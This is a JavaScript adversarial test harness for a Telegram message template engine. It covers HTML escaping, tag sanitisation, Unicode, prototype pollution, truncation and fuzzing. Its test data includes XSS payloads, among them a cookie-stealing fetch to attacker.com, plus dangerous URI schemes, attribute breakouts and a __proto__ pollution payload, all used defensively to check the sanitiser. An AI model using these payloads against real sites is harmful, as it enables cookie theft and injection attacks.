'use strict';
// =============================================================================
// ADVERSARIAL STRESS TEST & FUZZ HARNESS FOR TELEGRAM TEMPLATE ENGINE
// Track: Teamwork Challenger (Empirical Challenge & Verification)
// Target: lib/telegram-template-engine.js
// =============================================================================

const assert = require('assert');
const engine = require('../lib/telegram-template-engine');
const notifier = require('../lib/telegram-notifier');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function runChallenge(id, description, fn) {
    totalTests++;
    try {
        fn();
        passedTests++;
        console.log(`[PASS] [${id}] ${description}`);
    } catch (err) {
        failedTests++;
        const failureRecord = { id, description, error: err.message, stack: err.stack };
        failures.push(failureRecord);
        console.error(`[FAIL] [${id}] ${description}`);
        console.error(`       Details: ${err.message}`);
    }
}

async function runChallengeAsync(id, description, fn) {
    totalTests++;
    try {
        await fn();
        passedTests++;
        console.log(`[PASS] [${id}] ${description}`);
    } catch (err) {
        failedTests++;
        const failureRecord = { id, description, error: err.message, stack: err.stack };
        failures.push(failureRecord);
        console.error(`[FAIL] [${id}] ${description}`);
        console.error(`       Details: ${err.message}`);
    }
}

console.log('================================================================================');
console.log('   EMPIRICAL ADVERSARIAL STRESS HARNESS — TELEGRAM TEMPLATE ENGINE');
console.log('================================================================================\n');

// =============================================================================
// CATEGORY 1: MALICIOUS HTML INJECTION PAYLOADS IN DYNAMIC VARIABLES
// =============================================================================
console.log('--- CATEGORY 1: MALICIOUS HTML INJECTION PAYLOADS IN VARIABLES ---');

runChallenge('ADV-01-01', 'Script tag injection in customer_name is escaped and cannot execute', () => {
    const payload = '<script>alert(document.cookie)</script>';
    const res = engine.renderTemplate('Name: {{customer_name}}', { customer_name: payload });
    assert.ok(!res.text.includes('<script>'), 'Must not contain raw <script>');
    assert.ok(!res.text.includes('</script>'), 'Must not contain raw </script>');
    assert.ok(res.text.includes('&lt;script&gt;alert(document.cookie)&lt;/script&gt;'), 'Must be HTML escaped');
});

runChallenge('ADV-01-02', 'Img tag with onerror payload in product_name is escaped and neutralized', () => {
    const payload = '<img src="x" onerror="fetch(\'https://attacker.com/steal?data=\'+document.cookie)">';
    const res = engine.renderTemplate('Product: {{product_name}}', { product_name: payload });
    assert.ok(!res.text.includes('<img'), 'Must not contain raw <img');
    assert.ok(res.text.includes('&lt;img'), 'Must escape angle bracket of img tag');
    assert.ok(res.text.includes('&quot;'), 'Must escape quotation marks of attributes');
});

runChallenge('ADV-01-03', 'Javascript pseudo-protocol in variable interpolated into href attribute', () => {
    const payload = 'javascript:alert(1)';
    const template = '<a href="{{dashboard_url}}">Click Here</a>';
    const res = engine.renderTemplate(template, { dashboard_url: payload });
    // Telegram HTML sanitizer strips <a> if href does not match https?:// or tg://
    assert.ok(!res.text.includes('href="javascript:'), 'Must not permit javascript: protocol in href');
    assert.ok(!res.text.includes('javascript:alert(1)'), 'Must not allow javascript link execution');
});

runChallenge('ADV-01-04', 'Attribute breakout payload via double-quote injection in variable', () => {
    const payload = 'https://trusted.com" onfocus="alert(1)" bad="';
    const template = '<a href="{{dashboard_url}}">Link</a>';
    const res = engine.renderTemplate(template, { dashboard_url: payload });
    assert.ok(!res.text.includes('onfocus="alert(1)"'), 'Must not allow attribute breakout to onfocus');
    assert.ok(!res.text.includes('bad="'), 'Must not create injected attribute');
});

runChallenge('ADV-01-05', 'Data URI payload in dynamic link is stripped', () => {
    const payload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
    const template = '<a href="{{dashboard_url}}">Data Link</a>';
    const res = engine.renderTemplate(template, { dashboard_url: payload });
    assert.ok(!res.text.includes('href="data:'), 'Must strip data: URI href');
});

runChallenge('ADV-01-06', 'VBScript and file URI payloads in dynamic links are stripped', () => {
    for (const proto of ['vbscript:msgbox(1)', 'file:///etc/passwd', 'ms-appx-web:///test']) {
        const template = `<a href="{{dashboard_url}}">Link</a>`;
        const res = engine.renderTemplate(template, { dashboard_url: proto });
        assert.ok(!res.text.includes(`href="${proto}"`), `Protocol ${proto} must be rejected`);
    }
});

runChallenge('ADV-01-07', 'Double HTML entity encoding attacks in dynamic variables', () => {
    const payload = '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;';
    const res = engine.renderTemplate('Alert: {{error_message}}', { error_message: payload });
    assert.ok(res.text.includes('&amp;amp;lt;script&amp;amp;gt;'));
    assert.ok(!res.text.includes('<script>'));
});

runChallenge('ADV-01-08', 'Nested template variable injection payload (e.g. {{ {{order_id}} }})', () => {
    const template = 'Nested: {{ {{order_id}} }} and {{{order_id}}}';
    const res = engine.renderTemplate(template, { order_id: 'ORVA-999' });
    assert.ok(typeof res.text === 'string');
    assert.ok(res.text.includes('ORVA-999'));
});

// =============================================================================
// CATEGORY 2: MALFORMED TEMPLATE MARKUP & TAG SANITIZATION
// =============================================================================
console.log('\n--- CATEGORY 2: MALFORMED TEMPLATE MARKUP & TAG SANITIZATION ---');

runChallenge('ADV-02-01', 'Auto-closing of valid tags: <b><i><u><s><code><blockquote> in LIFO order', () => {
    const template = '<b><i><u><s><code><blockquote>Deeply nested without close';
    const res = engine.renderTemplate(template, {});
    assert.ok(res.text.endsWith('</blockquote></code></s></u></i></b>'), 
        `Expected LIFO closing but got: ${res.text.slice(-80)}`);
});

runChallenge('ADV-02-02', 'Mismatched interleaved tags: <b><i><u>text</b></i></u> re-ordered correctly', () => {
    const template = '<b><i><u>Interleaved</b></i></u>';
    const res = engine.renderTemplate(template, {});
    assert.strictEqual(res.text, '<b><i><u>Interleaved</u></i></b>');
});

runChallenge('ADV-02-03', 'Orphaned closing tags with no opening tag are safely discarded', () => {
    const template = '</b></i></u></s></code></a>Plain Text</b>';
    const res = engine.renderTemplate(template, {});
    assert.strictEqual(res.text, 'Plain Text');
});

runChallenge('ADV-02-04', 'Unsupported tags (<br>, <hr>, <p>, <table>, <div>, <span> without spoiler)', () => {
    const template = '<table><tr><td>Cell</td></tr></table><p>Para 1</p><hr><br><div>Div</div><span class="normal">Normal</span>';
    const res = engine.renderTemplate(template, {});
    assert.ok(!res.text.includes('<table'), 'Table tag must be stripped');
    assert.ok(!res.text.includes('<tr'), 'Tr tag must be stripped');
    assert.ok(!res.text.includes('<td'), 'Td tag must be stripped');
    assert.ok(!res.text.includes('<p'), 'P tag must be converted/stripped');
    assert.ok(!res.text.includes('<hr'), 'Hr tag must be stripped');
    assert.ok(!res.text.includes('<br'), 'Br tag must be converted to newline');
    assert.ok(!res.text.includes('<div'), 'Div tag must be stripped');
    assert.ok(!res.text.includes('<span'), 'Span without tg-spoiler must be stripped');
    assert.ok(res.text.includes('Cell'), 'Inner text must be preserved');
    assert.ok(res.text.includes('Para 1'), 'Inner text must be preserved');
    assert.ok(res.text.includes('Div'), 'Inner text must be preserved');
    assert.ok(res.text.includes('Normal'), 'Inner text must be preserved');
});

runChallenge('ADV-02-05', 'Telegram preformatted code tag <pre> must be preserved and not stripped', () => {
    const template = '<pre>const x = 42;</pre>';
    const res = engine.renderTemplate(template, {});
    assert.ok(res.text.includes('<pre>'), `Expected <pre> to be preserved but got: ${res.text}`);
    assert.ok(res.text.includes('</pre>'), `Expected </pre> to be preserved but got: ${res.text}`);
});

runChallenge('ADV-02-06', 'Supported specialized tags (tg-spoiler, tg-emoji, blockquote expandable)', () => {
    const template = '<span class="tg-spoiler">Secret</span> <blockquote expandable>Long quote</blockquote> <tg-emoji emoji-id="5368324170671202286">👍</tg-emoji>';
    const res = engine.renderTemplate(template, {});
    assert.ok(res.text.includes('<span class="tg-spoiler">Secret</span>'));
    assert.ok(res.text.includes('<blockquote expandable>Long quote</blockquote>'));
    assert.ok(res.text.includes('<tg-emoji emoji-id="5368324170671202286">👍</tg-emoji>'));
});

runChallenge('ADV-02-07', 'Named HTML entities mapping (&nbsp;, &mdash;, &euro;, &copy;, etc.)', () => {
    const template = 'Price: 100&nbsp;&euro; &copy; 2026 &mdash; ORVA&hellip;';
    const res = engine.renderTemplate(template, {});
    assert.ok(res.text.includes('Price: 100 € © 2026 — ORVA…'));
});

// =============================================================================
// CATEGORY 3: UNICODE, ARABIC HARAKAT, BIDI, EMOJI SEQUENCES & SURROGATES
// =============================================================================
console.log('\n--- CATEGORY 3: UNICODE, ARABIC HARAKAT, BIDI & EMOJIS ---');

runChallenge('ADV-03-01', 'Arabic text with full Harakat / Tashkeel diacritics', () => {
    const diacritics = 'فَتْحٌ مُبِينٌ وَنَصْرٌ مِنَ اللَّهِ وَفَتْحٌ قَرِيبٌ وَبَشِّرِ الْمُؤْمِنِينَ';
    const res = engine.renderTemplate('<b>الآية:</b> {{cancellation_reason}}', { cancellation_reason: diacritics });
    assert.ok(res.text.includes(diacritics), 'Diacritics must not be corrupted or stripped');
});

runChallenge('ADV-03-02', 'BiDi control characters (RLO, LRO, RLE, LRE, PDF, ALM, RLI, LRI)', () => {
    const bidiPayload = 'ORVA-\u202E\u20661234\u2069\u202C-DZ \u200E\u200F';
    const res = engine.renderTemplate('ID: {{order_id}}', { order_id: bidiPayload });
    assert.ok(res.text.includes(bidiPayload), 'BiDi control characters must pass without crash');
});

runChallenge('ADV-03-03', 'Complex multi-codepoint emojis (ZWJ sequences, skin tones, flags)', () => {
    const emojis = '👨‍👩‍👧‍👦 🧑🏽‍💻 🇩🇿 🏎️ 🇵🇸';
    const res = engine.renderTemplate('Icons: {{product_name}}', { product_name: emojis });
    assert.ok(res.text.includes(emojis), 'Emoji sequences must remain intact');
});

runChallenge('ADV-03-04', 'Surrogate pairs preservation (characters outside BMP, U+10000 to U+10FFFF)', () => {
    const gothicText = '𐌰𐌱𐌲𐌳𐌴𐌶𐌷𐌸 𝄞 𝅘𝅥𝅯 𝅘𝅥𝅮';
    const res = engine.renderTemplate('Music: {{product_name}}', { product_name: gothicText });
    assert.ok(res.text.includes(gothicText));
});

runChallenge('ADV-03-05', 'Mixed Arabic, French, Tifinagh, Latin and numbers in Algerian context', () => {
    const mixed = 'Commande N° 94821 — زبون من ولاية تيزي وزو ⵜⵉⵣⵉ ⵡⴻⵣⵣⵓ (15) — Prix: 4.950 د.ج';
    const res = engine.renderTemplate('{{product_name}}', { product_name: mixed });
    assert.ok(res.text.includes(mixed));
});

// =============================================================================
// CATEGORY 4: PROTOTYPE POLLUTION ATTEMPTS & OBJECT INTEGRITY
// =============================================================================
console.log('\n--- CATEGORY 4: PROTOTYPE POLLUTION ATTEMPTS & OBJECT INTEGRITY ---');

runChallenge('ADV-04-01', 'Template requesting __proto__, constructor, prototype renders empty', () => {
    const tpl = 'Pollution: {{__proto__}} | {{constructor}} | {{prototype}}';
    const res = engine.renderTemplate(tpl, {});
    assert.strictEqual(res.text, 'Pollution:  |  | ');
});

runChallenge('ADV-04-02', 'Template requesting Object methods (valueOf, toString, hasOwnProperty) renders empty', () => {
    const tpl = 'Methods: {{valueOf}} | {{toString}} | {{hasOwnProperty}} | {{isPrototypeOf}}';
    const res = engine.renderTemplate(tpl, {});
    assert.strictEqual(res.text, 'Methods:  |  |  | ');
});

runChallenge('ADV-04-03', 'Adversarial context payload attempting to pollute Object.prototype', () => {
    const evilPayload = JSON.parse('{"__proto__": {"polluted": "YES_PWNED"}}');
    const res = engine.renderTemplate('Order: {{order_id}} {{polluted}}', evilPayload);
    assert.strictEqual(Object.prototype.polluted, undefined, 'Object.prototype must not be polluted');
    assert.ok(!res.text.includes('YES_PWNED'), 'Polluted property must not render');
});

runChallenge('ADV-04-04', 'EVENT_REGISTRY functions survive Object.prototype method names without crashing', () => {
    const prototypeKeys = ['toString', 'valueOf', 'constructor', '__proto__', 'hasOwnProperty', 'isPrototypeOf'];
    for (const key of prototypeKeys) {
        // Must return false / empty / clean fallback and NOT throw TypeError
        const valid = engine.isValidVariable(key, 'order_id');
        assert.strictEqual(valid, false, `isValidVariable should return false for event=${key}`);

        const vars = engine.getEventVariables(key);
        assert.deepStrictEqual(vars, [], `getEventVariables should return [] for event=${key}`);

        const sample = engine.getSampleData(key);
        assert.ok(sample && typeof sample === 'object', `getSampleData should return fallback object for event=${key}`);

        const valRes = engine.validateTemplate(key, 'Order: {{order_id}}');
        assert.strictEqual(valRes.valid, false, `validateTemplate should return valid=false for event=${key}`);

        const renRes = engine.renderTemplate('Order: {{order_id}}', { order_id: '123' }, { event: key });
        assert.ok(typeof renRes.text === 'string', `renderTemplate should return string for event=${key}`);
    }
});

runChallenge('ADV-04-05', 'Context with Object.create(null) does not throw TypeError in maskPhone or renderTemplate', () => {
    const nullProtoPhone = Object.create(null);
    const res = engine.renderTemplate('Phone: {{customer_phone}}', { phone: nullProtoPhone });
    assert.ok(typeof res.text === 'string');
    assert.ok(!res.text.includes('undefined'));
});

runChallenge('ADV-04-06', 'Context with overridden hasOwnProperty does not break variable resolution', () => {
    const hostileContext = {
        hasOwnProperty: 'I am a string, not a function',
        order_id: 'ORVA-SAFE-1'
    };
    const res = engine.renderTemplate('ID: {{order_id}}', hostileContext);
    assert.strictEqual(res.text, 'ID: ORVA-SAFE-1');
});

// =============================================================================
// CATEGORY 5: MASSOVERSIZED INPUTS (10,000+ CHARS) & TRUNCATION SAFETY
// =============================================================================
console.log('\n--- CATEGORY 5: MASSOVERSIZED INPUTS & TRUNCATION SAFETY ---');

runChallenge('ADV-05-01', 'Massively oversized plain text (10,000 chars) is truncated under 4,096 chars', () => {
    const text = 'A'.repeat(10000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `Expected <= 4096 but got ${res.charCount}`);
    assert.strictEqual(res.truncated, true);
    assert.ok(res.text.includes('تم اقتطاع الرسالة'));
});

runChallenge('ADV-05-02', 'Massively oversized input with open <b> tag must auto-close tag and remain <= 4096', () => {
    const text = '<b>' + 'X'.repeat(10000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `Expected <= 4096 but got ${res.charCount}`);
    assert.strictEqual(res.truncated, true);
    assert.ok(res.text.endsWith('</b>'), `Must end with </b> but ended with: ${res.text.slice(-20)}`);
});

runChallenge('ADV-05-03', 'Surrogate pair boundary at 4,000 chars does not split multi-byte surrogate pairs', () => {
    const fill = 'A'.repeat(3999);
    const text = fill + '🎉' + 'B'.repeat(5000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `Expected <= 4096 but got ${res.charCount}`);
    for (let i = 0; i < res.text.length; i++) {
        const code = res.text.charCodeAt(i);
        if (code >= 0xD800 && code <= 0xDBFF) {
            assert.ok(i + 1 < res.text.length, 'Surrogate pair must not be split at end of string');
            const nextCode = res.text.charCodeAt(i + 1);
            assert.ok(nextCode >= 0xDC00 && nextCode <= 0xDFFF, 'High surrogate must be followed by low surrogate');
            i++;
        }
    }
});

runChallenge('ADV-05-04', 'Long HTML tag crossing truncation boundary (e.g. <a> tag near 3,990 chars) must NOT exceed 4,096 chars', () => {
    const fill = 'C'.repeat(3990);
    const longUrl = 'https://example.com/' + 'param_'.repeat(50);
    const tag = `<a href="${longUrl}">Click Link</a>`;
    const text = fill + tag + 'D'.repeat(5000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `CRITICAL: Message length exceeded Telegram maximum 4,096 chars! Got ${res.charCount}`);
});

runChallenge('ADV-05-05', 'Unclosed angle bracket in 10,000 chars (<a href="https://example.com/...) must NOT exceed 4,096 chars', () => {
    const text = 'E'.repeat(3990) + '<a href="https://example.com/' + 'F'.repeat(6000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `CRITICAL: Unclosed tag caused length to explode beyond 4096! Got ${res.charCount}`);
});

runChallenge('ADV-05-06', 'Many nested tags each with long closing tags near 4000 limit must NOT exceed 4,096 chars', () => {
    let openTags = '';
    for (let i = 0; i < 15; i++) {
        openTags += '<blockquote>';
    }
    const text = openTags + 'G'.repeat(5000);
    const res = engine.renderTemplate(text, {});
    assert.ok(res.charCount <= 4096, `CRITICAL: Closing tags caused length to exceed 4096! Got ${res.charCount}`);
});

// =============================================================================
// CATEGORY 6: FUZZING WITH UNTYPED & ADVERSARIAL INPUTS
// =============================================================================
console.log('\n--- CATEGORY 6: FUZZING WITH UNTYPED & ADVERSARIAL INPUTS ---');

const fuzzyValues = [
    null,
    undefined,
    NaN,
    Infinity,
    -Infinity,
    0,
    -1,
    true,
    false,
    '',
    '   ',
    [],
    [1, 2, 'three'],
    [null, undefined, NaN],
    {},
    { a: 1, b: null },
    { toString: () => 'custom_string' },
    { valueOf: () => 42 },
    Symbol('fuzz_symbol'),
    () => 'function_result',
    new Date(),
    new RegExp('test'),
    new Error('fuzz error'),
    Buffer.from('fuzz buffer'),
    BigInt(9007199254740991)
];

runChallenge('ADV-06-01', 'Fuzzing templateText argument in renderTemplate() with all primitive and object types', () => {
    for (const val of fuzzyValues) {
        try {
            const res = engine.renderTemplate(val, { order_id: 'ORVA-FUZZ' });
            assert.ok(res && typeof res.text === 'string');
            assert.ok(typeof res.charCount === 'number');
            assert.ok(Array.isArray(res.warnings));
        } catch (err) {
            if (typeof val === 'symbol') continue;
            throw new Error(`Crashed on templateText = ${typeof val} (${String(val)}): ${err.message}`);
        }
    }
});

runChallenge('ADV-06-02', 'Fuzzing context argument in renderTemplate() with all primitive and object types', () => {
    const template = 'Order: {{order_id}} | Name: {{customer_name}} | Total: {{grand_total}}';
    for (const val of fuzzyValues) {
        try {
            const res = engine.renderTemplate(template, val, { event: 'ORDER_CREATED' });
            assert.ok(res && typeof res.text === 'string');
            assert.ok(!res.text.includes('undefined'));
            assert.ok(!res.text.includes('null'));
            assert.ok(!res.text.includes('NaN'));
            assert.ok(!res.text.includes('[object Object]'));
        } catch (err) {
            throw new Error(`Crashed on context = ${typeof val}: ${err.message}`);
        }
    }
});

runChallenge('ADV-06-03', 'Fuzzing individual variable values inside context with fuzzy values', () => {
    const template = 'Order: {{order_id}} | Total: {{grand_total}}';
    for (const val of fuzzyValues) {
        try {
            const res = engine.renderTemplate(template, { order_id: val, grand_total: val }, { event: 'ORDER_CREATED' });
            assert.ok(res && typeof res.text === 'string');
            assert.ok(!res.text.includes('undefined'), `Rendered "undefined" for value: ${String(val)}`);
            assert.ok(!res.text.includes('null'), `Rendered "null" for value: ${String(val)}`);
            assert.ok(!res.text.includes('NaN'), `Rendered "NaN" for value: ${String(val)}`);
            assert.ok(!res.text.includes('[object Object]'), `Rendered "[object Object]" for value: ${String(val)}`);
        } catch (err) {
            if (typeof val === 'symbol') continue;
            throw new Error(`Crashed on variable value = ${typeof val}: ${err.message}`);
        }
    }
});

runChallenge('ADV-06-04', 'Fuzzing validateTemplate(event, templateText) with all fuzzy inputs', () => {
    for (const evt of fuzzyValues) {
        for (const tpl of fuzzyValues) {
            try {
                const res = engine.validateTemplate(evt, tpl);
                assert.ok(res && typeof res.valid === 'boolean');
                assert.ok(Array.isArray(res.errors));
                assert.ok(Array.isArray(res.warnings));
            } catch (err) {
                if (typeof evt === 'symbol' || typeof tpl === 'symbol') continue;
                throw new Error(`validateTemplate crashed on event=${typeof evt}, tpl=${typeof tpl}: ${err.message}`);
            }
        }
    }
});

runChallenge('ADV-06-05', 'Fuzzing isValidVariable(event, variableName) with all fuzzy inputs', () => {
    for (const evt of fuzzyValues) {
        for (const vName of fuzzyValues) {
            try {
                const res = engine.isValidVariable(evt, vName);
                assert.ok(typeof res === 'boolean');
            } catch (err) {
                if (typeof evt === 'symbol' || typeof vName === 'symbol') continue;
                throw new Error(`isValidVariable crashed on event=${typeof evt}, vName=${typeof vName}: ${err.message}`);
            }
        }
    }
});

runChallenge('ADV-06-06', 'Fuzzing buildDefaultMessage(event, orderId, data) with all fuzzy inputs', () => {
    for (const evt of ['ORDER_CREATED', 'SHIPMENT_CREATED', 'SHIPMENT_FAILED', 'STATUS_UPDATED', 'ORDER_CANCELLED', 'ADMIN_ALERT', 'UNKNOWN_EVT', null, undefined]) {
        for (const d of fuzzyValues) {
            try {
                const res = engine.buildDefaultMessage(evt, 'ORVA-FUZZ-ID', d);
                assert.ok(typeof res === 'string');
                assert.ok(res.length > 0);
            } catch (err) {
                if (typeof d === 'symbol') continue;
                throw new Error(`buildDefaultMessage crashed on evt=${evt}, data=${typeof d}: ${err.message}`);
            }
        }
    }
});

runChallenge('ADV-06-07', 'Fuzzing sanitizeTelegramTemplate() with deeply nested tags', () => {
    const deepTags = '<b>'.repeat(500) + 'Hello' + '</b>'.repeat(500);
    const res = engine.sanitizeTelegramTemplate(deepTags);
    assert.ok(typeof res === 'string');
    assert.ok(res.includes('Hello'));
});

// =============================================================================
// SUMMARY & VERDICT
// =============================================================================
console.log('\n================================================================================');
console.log(`TOTAL ADVERSARIAL CHALLENGES: ${totalTests}`);
console.log(`PASSED:                       ${passedTests} (${Math.round((passedTests / totalTests) * 100)}%)`);
console.log(`FAILED:                       ${failedTests}`);
console.log('================================================================================');

if (failedTests > 0) {
    console.log('\n❌ EMPIRICAL FAILURES DETECTED:');
    for (const f of failures) {
        console.log(`  - [${f.id}] ${f.description}:`);
        console.log(`      Error: ${f.error}`);
    }
    console.log('\n💥 VERDICT: REQUEST_CHANGES');
} else {
    console.log('\n🎉 ALL ADVERSARIAL CHALLENGES EMPIRICALLY PASSED!');
    console.log('🌟 VERDICT: APPROVE');
}
console.log('================================================================================\n');

process.exit(failedTests > 0 ? 1 : 0);
